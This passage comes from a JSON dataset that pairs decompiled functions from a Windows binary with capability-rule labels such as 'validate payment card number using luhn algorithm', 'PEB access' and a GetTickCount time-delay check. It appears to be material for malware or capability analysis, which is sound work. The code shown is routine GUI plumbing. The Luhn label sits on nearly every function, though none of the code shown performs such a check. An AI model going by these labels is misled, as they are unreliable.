        "token_count": 147
    },
    "00443d68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00443d68(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar2 = 4;\n    if (param_2 != 0) {\n        fcn.00438ecc();\n        fcn.00438ecc();\n        if (((var_1ch < var_ch) || (var_14h <= var_4h)) || (var_8h < var_18h)) {\n            if (((var_20h < var_10h) || (var_18h <= var_8h)) || (var_4h < var_14h)) {\n                iVar1 = var_1ch + var_14h >> 1;\n                if (iVar1 < 0) {\n                    iVar1 = iVar1 + ((var_1ch + var_14h & 1U) != 0);\n                }\n                if (iVar1 <= var_ch) {\n                    uVar2 = 2;\n                }\n            }\n            else {\n                uVar2 = 3;\n            }\n        }\n        else {\n            uVar2 = 1;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 331
    },
    "00443f9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00443f9c(char param_1)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00442350();\n    if (iVar1 == 0) {\n        if (param_1 != '\\0') {\n            fcn.00412708();\n            iVar1 = fcn.00442b44();\n            if (iVar1 == 0) {\n                uVar2 = 0;\n            }\n            else {\n                uVar2 = *(iVar1 + 4);\n            }\n            fcn.00443d68(uVar2);\n            (**(*in_EAX + 8))();\n        }\n    }\n    else {\n        if (param_1 == '\\0') {\n            fcn.00443de4(&stack0xfffffffc);\n        }\n        else {\n            fcn.00443e64(&stack0xfffffffc);\n        }\n        (**(*in_EAX[5] + 0x7c))();\n    }\n    return;\n}\n",
        "token_count": 250
    },
    "00444a70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00444a70(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffac;\n    uint *puVar3;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_10h = 0;\n    var_4h = 0;\n    uStack48 = 0x444be8;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack52;\n    puVar3 = &var_4h;\n    var_ch = sub.kernel32.dll_GetCurrentProcessId();\n    var_8h._0_1_ = 0;\n    fcn.00408cb8(puVar3);\n    fcn.00403ffc();\n    uVar1 = fcn.00404468();\n    *0x463b1c = sub.kernel32.dll_GlobalAddAtomA(uVar1);\n    puVar3 = &var_10h;\n    sub.kernel32.dll_GetCurrentThreadId_1();\n    fcn.00408cb8(puVar3);\n    fcn.00403ffc();\n    uVar1 = fcn.00404468();\n    *0x463b1e = sub.kernel32.dll_GlobalAddAtomA(uVar1);\n    uVar1 = fcn.00404468();\n    *0x463b28 = sub.user32.dll_RegisterWindowMessageA(uVar1);\n    *0x463b60 = fcn.00413d78();\n    fcn.00444674();\n    *0x463b10 = fcn.0044449c();\n    uVar1 = fcn.00456ca8();\n    **0x4621e4 = uVar1;\n    uVar1 = fcn.00457d8c();\n    **0x462098 = uVar1;\n    fcn.00459974();\n    fcn.0041352c();\n    iVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x444c24);\n    if (iVar2 != 0) {\n        *0x461a88 = sub.kernel32.dll_GetProcAddress_1(iVar2, 0x444c2c);\n        in_stack_ffffffac = iVar2;\n    }\n    *in_FS_OFFSET = in_stack_ffffffac;\n    fcn.00403fa8(0x444bef);\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 617
    },
    "00445724": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445724(code *arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t in_EDX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(*(in_EAX + 0x30) + 8);\n    if (-1 < iVar1 + -1) {\n        iVar2 = 0;\n        do {\n            if (*(*(*(*(in_EAX + 0x30) + 4) + iVar2 * 4) + 4) == in_EDX) {\n                (*arg_8h)();\n            }\n            iVar2 = iVar2 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 189
    },
    "00445b48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00445b48(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.00419e24();\n    *(in_EAX + 0x6a) = 1;\n    *(in_EAX + 0x80) = 0xffffffff;\n    *(in_EAX + 0x86) = 1;\n    *(in_EAX + 0x90) = 0;\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 197
    },
    "004464f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.004464f4(int32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t in_ECX;\n    int32_t extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.0040357c();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    fcn.0041951c();\n    in_EAX[0xd] = in_ECX;\n    in_EAX[0xc] = arg_8h;\n    (**(*in_EAX + 0x34))();\n    if (in_DL != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 204
    },
    "00446680": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.00446680(void)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    uint arg_ch;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint var_18h;\n    uint hdc;\n    int32_t var_4h;\n    \n    uStack36 = 0;\n    puStack40 = 0x446691;\n    var_4h = in_EAX;\n    hdc = sub.user32.dll_GetDC();\n    uStack44 = 0x446721;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    piVar1 = *(var_4h + 0x50);\n    puStack40 = &stack0xfffffffc;\n    sub.gdi32.dll_CreateCompatibleBitmap(hdc, *(var_4h + 0x34), *(var_4h + 0x30));\n    fcn.00422acc();\n    fcn.00421f4c();\n    fcn.0041d0bc();\n    arg_ch = (**(*piVar1 + 0x20))();\n    arg_8h = &fcn.00446680::var_18h;\n    (**(*piVar1 + 0x2c))();\n    fcn.00412730(arg_8h, arg_ch);\n    fcn.00421f4c(&fcn.00446680::var_18h);\n    fcn.0041d460();\n    *in_FS_OFFSET = arg_8h;\n    sub.user32.dll_ReleaseDC(0, hdc, 0x446728);\n    return;\n}\n",
        "token_count": 385
    },
    "00446744": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00446744(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = *(in_EAX + 0x34);\n    uStack12 = *(in_EAX + 0x30);\n    puVar1 = &uStack8;\n    sub.comctl32.dll_ImageList_GetIconSize(param_2, puVar1, &uStack12);\n    *(in_EAX + 0x34) = puVar1;\n    *(in_EAX + 0x30) = param_2;\n    fcn.00446680();\n    return;\n}\n",
        "token_count": 157
    },
    "0044697c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044697c(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x446997;\n    fcn.00421984();\n    uStack36 = 0x446a2b;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack44 = 0x4469b4;\n    puStack32 = &stack0xfffffffc;\n    fcn.00421984();\n    uStack48 = 0x446a0e;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    fcn.00446674();\n    uVar1 = fcn.00446850();\n    uVar2 = fcn.00446850(uVar1);\n    uVar1 = *(in_EAX + 0x3c);\n    sub.comctl32.dll_ImageList_Add(uVar1, uVar2);\n    *in_FS_OFFSET = uVar1;\n    fcn.00403258(0x446a15);\n    return;\n}\n",
        "token_count": 333
    },
    "004475b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.004475b0(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    piVar2 = in_EAX;\n    if (param_2 != NULL) {\n        puStack32 = 0x4475c8;\n        piVar1 = fcn.00446b64();\n        puStack32 = 0x4475d1;\n        piVar2 = fcn.00446b64();\n        if (piVar1 == piVar2) {\n            puStack32 = 0x4475e5;\n            iVar3 = fcn.00446b64();\n            if (iVar3 != 0) {\ncode_r0x004475fd:\n                puStack32 = 0x447609;\n                fcn.00403228();\n                uStack36 = 0x44768c;\n                uStack40 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd8;\n                puStack44 = 0x447624;\n                puStack32 = &fcn.004475b0::var_1h + 1;\n                (**(*in_EAX + 0x3c))();\n                puStack44 = 0x447630;\n                fcn.00403228();\n                uStack48 = 0x44766f;\n                uStack52 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffcc;\n                puStack44 = &fcn.004475b0::var_1h + 1;\n                (**(*param_2 + 0x3c))();\n                var_1h._0_1_ = fcn.0044756c();\n                *in_FS_OFFSET = uStack52;\n                puStack44 = 0x447676;\n                uStack48 = 0x44766e;\n                uVar4 = fcn.00403258();\n                return uVar4;\n            }\n            puStack32 = 0x4475f0;\n            piVar2 = fcn.00446b64();\n            if (piVar2 != NULL) goto code_r0x004475fd;\n            var_1h._0_1_ = 1;\n            goto code_r0x00447693;\n        }\n    }\n    var_1h._0_1_ = 0;\ncode_r0x00447693:\n    return piVar2 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 657
    },
    "004476fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004476fc(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00419894();\n    uVar2 = *(*in_EAX + 0x38);\n    uVar1 = *(*in_EAX + 0x3c);\n    piVar3 = in_EAX;\n    fcn.004476a0(&stack0xfffffffc);\n    (**(*param_2 + 8))(uVar1, in_EAX, uVar2, piVar3);\n    return;\n}\n",
        "token_count": 161
    },
    "004479e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004479e8(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStackY48;\n    uint uStackY44;\n    uchar *puStackY40;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStackY40 = 0x447a07;\n    iVar1 = fcn.0041a014(0);\n    uStackY44 = 0x447a48;\n    iStackY48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    if (iVar1 != 0) {\n        iVar1 = iVar1 + 0x14;\n    }\n    puStackY40 = &stack0xfffffffc;\n    sub.comctl32.dll_ImageList_Read();\n    fcn.00446804();\n    *in_FS_OFFSET = iVar1;\n    uStackY44 = 0x447a4f;\n    iStackY48 = 0x447a47;\n    fcn.00403258();\n    return;\n}\n",
        "token_count": 238
    },
    "00449a78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00449a78(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x70) != 0) && (cVar1 = fcn.004033e4(),  cVar1 != '\\0')) {\n        fcn.0044c314();\n        fcn.0044c810();\n    }\n    if (*(in_EAX + 0x70) != 0) {\n        fcn.0044d34c();\n    }\n    fcn.00449214();\n    return;\n}\n",
        "token_count": 135
    },
    "0044b35c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044b35c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_154h;\n    uint var_bch;\n    uint var_b8h;\n    \n    var_154h = 0x154;\n    iVar1 = sub.user32.dll_SystemParametersInfoA(0x29, 0, &var_154h, 0);\n    if (iVar1 != 0) {\n        **(arg_8h + -4) = var_bch;\n        **(arg_8h + 8) = var_b8h;\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "0044c130": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044c130(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    (**(**(arg_8h + -8) + 8))();\n    uVar1 = (**(**(arg_8h + -0xc) + 0x14))();\n    *(arg_8h + -0x10) = uVar1;\n    iVar2 = (**(**(arg_8h + -0x14) + 0x14))();\n    if (-1 < iVar2 + -1) {\n        do {\n            uVar1 = (**(**(arg_8h + -0x14) + 0x18))();\n            (**(**(arg_8h + -0x14) + 0x18))(uVar1);\n            (**(**(arg_8h + -8) + 0x3c))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00404040();\n    return;\n}\n",
        "token_count": 234
    },
    "0044cba8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint fcn.0044cba8(void)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    fcn.00449214();\n    return 0;\n}\n",
        "token_count": 62
    },
    "004502fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004502fc(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *0x461cec;\n    puStack32 = &stack0xfffffffc;\n    puStack44 = &stack0xfffffffc;\n    *0x461cec = 0;\n    uStack36 = 0x45039f;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    uStack48 = 0x450368;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    uVar2 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.004502ac, 0);\n    sub.user32.dll_EnumThreadWindows();\n    *in_FS_OFFSET = uVar2;\n    *in_FS_OFFSET = uStack52;\n    *0x461cec = uVar1;\n    return;\n}\n",
        "token_count": 265
    },
    "004504c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.004504c8(void)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    uint uStack8;\n    uchar uStack4;\n    \n    uStack8 = sub.user32.dll_GetActiveWindow();\n    uStack4 = 0;\n    pcVar3 = fcn.004504a8;\n    uVar1 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.004504a8, &uStack8);\n    uVar2 = sub.user32.dll_EnumThreadWindows(uVar1);\n    return CONCAT44(pcVar3, uVar2 & 0xffffff00 | pcVar3 & 0xff);\n}\n",
        "token_count": 150
    },
    "004506e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004506e8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd4;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x450759;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    iVar1 = fcn.004506c0();\n    if (iVar1 == 0) {\n        var_8h = *(in_EAX + 8);\n        var_4h._0_1_ = 0xb;\n        arg_ch = &var_8h;\n        in_stack_ffffffd4 = 0;\n        fcn.00405b0c();\n        fcn.0040b574(in_stack_ffffffd4, arg_ch);\n        fcn.004039e4();\n    }\n    *in_FS_OFFSET = in_stack_ffffffd4;\n    uStack36 = 0x450760;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 289
    },
    "00450768": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00450768(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.0040357c();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    fcn.00403228();\n    *(in_EAX + 4) = in_ECX;\n    *(in_EAX + 0x18) = arg_8h;\n    *(in_EAX + 10) = 0x50;\n    *(in_EAX + 8) = 8;\n    *(in_EAX + 0x1c) = 1;\n    *(in_EAX + 0x20) = 10;\n    *(in_EAX + 0x40) = 4;\n    *(in_EAX + 0x3c) = 0xc;\n    *(in_EAX + 0x28) = 0xff000014;\n    *(in_EAX + 0x2c) = 1;\n    *(in_EAX + 0x44) = 1;\n    if (in_DL != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 325
    },
    "004512ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004512ec(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.0043ba34();\n    *(in_EAX + 0x50) = *(in_EAX + 0x50) | *0x451360;\n    uVar1 = fcn.00450768(0);\n    *(in_EAX + 0x208) = uVar1;\n    uVar2 = 1;\n    uVar1 = fcn.00450768(1);\n    *(in_EAX + 0x20c) = uVar1;\n    *(in_EAX + 0x210) = 1;\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uVar2;\n    }\n    return in_EAX;\n}\n",
        "token_count": 253
    },
    "004516d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004516d8(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_stack_ffffffd0;\n    int32_t iVar6;\n    int32_t in_stack_ffffffd4;\n    int32_t iVar7;\n    int32_t in_stack_ffffffd8;\n    int32_t in_stack_ffffffdc;\n    int32_t iStack32;\n    int32_t iStack28;\n    \n    if (param_2 != NULL) {\n        (**(*param_2 + 0x44))();\n        uVar1 = *(*(in_EAX + 0x208) + 0x1a);\n        uVar2 = *(*(in_EAX + 0x20c) + 0x1a);\n        fcn.00439044(in_stack_ffffffd0 - uVar1, in_stack_ffffffd4 - uVar2, in_stack_ffffffd8 + uVar1, \n                     in_stack_ffffffdc + uVar2);\n        fcn.00439070();\n        iVar5 = iStack32;\n        iVar7 = iStack28;\n        fcn.00439044();\n        fcn.00439070();\n        if (iVar5 < 0) {\n            fcn.00450f50();\n        }\n        else {\n            iVar6 = iVar5;\n            iVar3 = fcn.00438f30();\n            if (iVar3 < iStack32) {\n                iVar3 = iStack32;\n                iVar4 = fcn.00438f30();\n                if (iVar4 < iStack32 - iVar5) {\n                    iVar3 = fcn.00438f30();\n                    iVar3 = iVar3 + iVar6;\n                }\n                fcn.00438f30(iVar6, iVar7, iVar3);\n                fcn.00450f50();\n            }\n        }\n        if (iVar7 < 0) {\n            fcn.00450f50();\n        }\n        else {\n            iVar5 = fcn.00438f74();\n            if (iVar5 < iStack28) {\n                iVar5 = fcn.00438f74();\n                if (iVar5 < iStack28 - iVar7) {\n                    fcn.00438f74();\n                }\n                fcn.00438f74();\n                fcn.00450f50();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 561
    },
    "00451a8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00451a8c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    var_ch = *(param_2 + 4);\n    uStack24 = 0x451aed;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    var_8h = param_2;\n    cVar1 = fcn.004033e4();\n    if (cVar1 == '\\0') {\n        *(var_8h + 4) = 1;\n    }\n    fcn.0043f084();\n    *in_FS_OFFSET = uStack28;\n    *(var_8h + 4) = var_ch;\n    return;\n}\n",
        "token_count": 221
    },
    "00451b1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00451b1c(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffea4;\n    uint *arg_ch;\n    uint uStack340;\n    uint uStack336;\n    uchar *puStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uchar *puStack316;\n    uint uStack312;\n    uint uStack308;\n    uchar *puStack304;\n    uint var_114h;\n    uint var_110h;\n    uint *var_10h;\n    uint var_ch;\n    int32_t *var_5h;\n    \n    if (param_2 != '\\0') {\n        puStack304 = 0x451b3a;\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    uStack308 = 0x451c80;\n    uStack312 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec8;\n    puStack316 = 0x451b5c;\n    puStack304 = &stack0xfffffffc;\n    var_5h._0_1_ = param_2;\n    unique0x100000eb = in_EAX;\n    (**(***0x4621d8 + 0x14))();\n    uStack320 = 0x451c60;\n    uStack324 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffebc;\n    uStack328 = 0;\n    puStack332 = 0x451b7b;\n    puStack316 = &stack0xfffffffc;\n    (**(*stack0xfffffff8 + 0xe0))();\n    puStack332 = 0x451b83;\n    iVar2 = fcn.004031a0();\n    if ((iVar2 != *0x44f088) && ((*(stack0xfffffff8 + 7) & 0x10) == 0)) {\n        *(stack0xfffffff8 + 0xbd) = *(stack0xfffffff8 + 0xbd) | 1;\n        uStack336 = 0x451c28;\n        uStack340 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffeac;\n        puStack332 = &stack0xfffffffc;\n        cVar1 = fcn.00413924();\n        if (cVar1 == '\\0') {\n            fcn.004031a8();\n            var_10h = &fcn.00451b1c::var_110h;\n            var_ch._0_1_ = 4;\n            arg_ch = &fcn.00451b1c::var_10h;\n            in_stack_fffffea4 = 0;\n            fcn.00405b0c();\n            fcn.0040b574(in_stack_fffffea4, arg_ch);\n            fcn.004039e4();\n        }\n        *in_FS_OFFSET = in_stack_fffffea4;\n        *(stack0xfffffff8 + 0xbd) = *(stack0xfffffff8 + 0xbd) & 0xfe;\n        return;\n    }\n    *in_FS_OFFSET = uStack328;\n    uStack320 = 0x451c67;\n    uStack324 = 0x451c5f;\n    (**(***0x4621d8 + 0x18))();\n    return;\n}\n",
        "token_count": 786
    },
    "004527ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004527ac(code *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t in_EDX;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.004402ac(arg_8h, arg_ch);\n    if ((in_EAX == in_EDX) && (var_8h = fcn.00419b40(),  -1 < var_8h + -1)) {\n        do {\n            fcn.00419b14();\n            cVar1 = fcn.00403454();\n            if (cVar1 == '\\0') {\n                (*arg_8h)();\n            }\n            var_8h = var_8h + -1;\n        } while (var_8h != 0);\n    }\n    return;\n}\n",
        "token_count": 191
    },
    "00455474": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00455474(int32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint32_t uVar2;\n    \n    uVar1 = (*in_EAX + in_ECX) - in_EDX;\n    uVar2 = uVar1 >> 0x1f;\n    if ((uVar1 ^ uVar2) - uVar2 < *(*(arg_8h + -4) + 0x2e4)) {\n        *in_EAX = in_EDX - in_ECX;\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "00455dd4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00455dd4(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x455e40;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    cVar1 = (**(*in_EAX + 0xe4))();\n    if (cVar1 != '\\0') {\n        fcn.00403454();\n        if ((cVar1 != '\\0') == true) {\n            fcn.00455f08();\n        }\n    }\n    else {\n        in_EAX[0x93] = 0;\n    }\n    *in_FS_OFFSET = uStack36;\n    return;\n}\n",
        "token_count": 200
    },
    "00456974": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456974(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    \n    iVar1 = fcn.0043e7a4();\n    *arg_8h = iVar1 == 0;\n    return;\n}\n",
        "token_count": 67
    },
    "00456be0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
